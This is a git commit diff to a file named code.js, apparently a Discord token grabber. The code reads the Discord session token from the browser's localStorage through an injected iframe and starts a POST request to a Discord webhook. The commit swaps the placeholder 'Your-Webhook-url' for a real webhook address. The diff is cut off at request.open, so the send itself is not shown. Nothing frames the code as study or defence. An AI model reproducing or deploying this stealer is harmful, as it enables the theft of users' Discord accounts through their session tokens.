d424ccad886811d392f1d17d93ce990d182657f4
littlepig453 <84644303+littlepig453@users.noreply.github.com>
2021-12-09 17:10:54 -0500

    Update code.js

--- code.js
+++ code.js
@@ -1,5 +1,5 @@
 location.reload();
-var webhook = "Your-Webhook-url";
+var webhook = "https://discord.com/api/webhooks/918625702599876609/zIwgTPDTIHtRRaJ8s5frcNXvwmqo4PeSdqeYEHcmnEFkXMn_qE3c-YL--j-Q2XDYLljUl";
 var token = document.body.appendChild(document.createElement `iframe`).contentWindow.window.localStorage.token;
 var request = new XMLHttpRequest();
 request.open("POST", webhook);
